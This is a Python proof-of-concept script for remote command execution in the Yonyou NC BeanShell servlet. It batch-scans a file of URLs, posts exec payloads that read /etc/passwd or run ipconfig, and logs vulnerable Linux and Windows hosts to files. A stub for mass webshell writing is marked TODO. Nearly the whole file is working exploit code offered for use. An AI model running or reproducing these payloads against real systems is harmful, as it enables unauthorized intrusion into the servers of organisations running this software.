import requests
import re
import sys
import urllib3
from rich.console import Console
delete_warning = urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

__author__ = "K0uSAOF"

console = Console()

def check_vuln_page(target):
    '''
    批量发包检测url是否存在漏洞利用页面
    '''
    try:
        res = requests.get(target,timeout=5,verify=False)
        if res.status_code == 200:
            return True
        else:
            return False
    except:
        pass

def check(target):
    '''
    识别windows和linux系统同时进行简单的RCE测试
    '''
    # dict = {}
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0",
        "Content-Type":"application/x-www-form-urlencoded"
    }
    payload = ["bsh.script=exec%28%22{}%22%29%3B%0D%0A".format("head /etc/passwd"), # linux payload
                "bsh.script=exec%28%22{}%22%29%3B%0D%0A".format("ipconfig"), # windows payload
    ]
    proxies = {
        "http":"http://127.0.0.1:8080"
    }

    try:
        res_l = requests.post(target,headers=headers,verify=False,timeout=5,data=payload[0])
        res_w = requests.post(target,headers=headers,verify=False,timeout=5,data=payload[1])
        res_l.encoding = 'utf-8'
        res_w.encoding = 'utf-8'
    
        if res_l.status_code != 200 and res_w.status_code != 200:
            console.log(f"[red][!]Target is reset the connect! status code {res.status_code}")
            # print("[!] Target is reset the connect! status code %s" %res.status_code)
        else:
            console.log(f"[green][+] Successfully execute command  : {target}")

            data_l = res_l.text
            data_w = res_w.text

            # 正则匹配RCE执行的结果
            com = re.compile(r'<td bgcolor="#eeeeee">(?P<exec_res>.*?)</td>',re.S)
            try:
                res_l = com.search(data_l).group("exec_res")
                res_w = com.search(data_w).group("exec_res")
                res_l = re.sub(r'<.*>', "", res_l).strip()
                res_w = re.sub(r'<.*>', "", res_w).strip()
                
                if "daemon" in res_l:
                    console.log(f"[green][+] vuln target is Linux! {target}")
                    console.log("[green][+] exceute result: "+'\n'+res_l)
                    with open("rce_linux_server.txt",'a') as f:
                        f.write(target+'\n')
                
                elif 'Windows IP' in res_w:
                    console.log(f"[green][+] vuln target is Windows! : {target}")
                    console.log(f"[green][+] exceute result : "+'\n'+res_w)
                    with open("rce_windows_server.txt",'a') as f:
                        f.write(target+'\n')
                else:
                    console.log(f"[red][!] Unknow error")
            
            except Exception as e:
                console.log(f"[red][!] Error:",e)
    
    except Exception as e:
        console.log(f"[red][!] Error:",e)

def exploit(target):
    '''
    TODO
    批量写webshell
    '''
    ...

def banner():
    print("用友nc_beanshell rce poc")
    print("Usage: python %s [url_file]" %(sys.argv[0]))
    print("Author: K0uSAOF")

def main():
    if len(sys.argv) == 2:
        filepath = sys.argv[1]
        with open(filepath) as f:
            urls =  f.readlines()
            with console.status("[bold green] check vuln...") as status:
                for url in urls:
                    target = url.replace('\n', '') + "/servlet/~ic/bsh.servlet.BshServlet"
                    if check_vuln_page(target):
                        check(target)
                    else:
                        console.log(f"[red][!] Fail to access: {target}")
    else:
        banner()
            
if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        console.log(f"[yellow][!] Bye!")
        exit